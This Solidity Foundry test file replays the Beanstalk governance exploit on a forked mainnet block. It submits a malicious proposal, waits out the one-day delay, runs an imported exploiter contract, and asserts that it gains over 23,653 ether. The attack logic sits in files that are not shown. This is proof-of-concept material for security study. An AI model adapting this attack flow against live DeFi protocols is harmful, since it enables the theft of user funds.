// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/BeanstalkProposal.sol";
import "../src/BeanstalkProposer.sol";
import "../src/BeanstalkExploiter.sol";

contract BeanstalkTest is Test {
    BeanstalkProposal proposal;
    BeanstalkProposer proposer;
    BeanstalkExploiter exploiter;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 14595905);

        proposal = new BeanstalkProposal();
        proposer = new BeanstalkProposer(address(proposal));
        exploiter = new BeanstalkExploiter();

        vm.deal(address(proposer), 73 ether); // fast track
    }

    function testExploit() public {
        proposer.propose();
        vm.warp(block.timestamp + (25 * 60 * 60)); // Wait > 1 day
        exploiter.exploit();

        assertTrue(address(exploiter).balance > 23_653 ether);
    }
}
